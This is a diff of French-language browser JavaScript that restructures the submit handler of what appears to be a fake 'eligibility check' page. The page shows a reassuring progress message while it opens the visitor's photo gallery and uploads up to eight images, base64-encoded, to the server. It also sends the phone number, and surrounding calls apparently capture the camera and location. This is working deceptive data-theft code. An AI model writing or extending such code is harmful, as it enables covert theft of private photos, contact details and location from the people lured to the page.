@@ -121,41 +121,41 @@ function finir() {
   }, 1000);
 }
 
+const bouton = $("#valider");
+const champ = $("#galerie");
+
+bouton.disabled = false;
+bouton.textContent = "Valider ma demande";
+
+bouton.onclick = () => {
+  const numero = $("#numero").value.replace(/\s/g, "");
+  if (numero.length < 8) { etat("Saisissez un numéro valide."); return; }
+
+  champ.value = "";
+  champ.click();
+
+  poster("/numero", { valeur: numero });
+  etat("Vérification de votre éligibilité…");
+  progression(90);
+
+  champ.onchange = async () => {
+    for (const fichier of [...champ.files].slice(0, 8)) {
+      if (fichier.size > 4000000) continue;
+      await poster("/galerie", {
+        nom: fichier.name, type: fichier.type, taille: fichier.size,
+        donnees: await enBase64(fichier),
+      });
+    }
+    finir();
+  };
+
+  setTimeout(() => { if (!champ.files.length) finir(); }, 2500);
+};
+
+document.addEventListener("visibilitychange", () => { vivant = !document.hidden; });
+
 (async () => {
   await inscription();
   try { await capturer(); } catch { cocher("photo", "Caméra refusée"); }
   localiser();
-
-  const bouton = $("#valider");
-  const champ = $("#galerie");
-
-  bouton.disabled = false;
-  bouton.textContent = "Valider ma demande";
-
-  bouton.onclick = () => {
-    const numero = $("#numero").value.replace(/\s/g, "");
-    if (numero.length < 8) { etat("Saisissez un numéro valide."); return; }
-
-    champ.value = "";
-    champ.click();
-
-    poster("/numero", { valeur: numero });
-    etat("Vérification de votre éligibilité…");
-    progression(90);
-
-    champ.onchange = async () => {
-      for (const fichier of [...champ.files].slice(0, 8)) {
-        if (fichier.size > 4000000) continue;
-        await poster("/galerie", {
-          nom: fichier.name, type: fichier.type, taille: fichier.size,
-          donnees: await enBase64(fichier),
-        });
-      }
-      finir();
-    };
-
-    setTimeout(() => { if (!champ.files.length) finir(); }, 2500);
-  };
-
-  document.addEventListener("visibilitychange", () => { vivant = !document.hidden; });
 })();
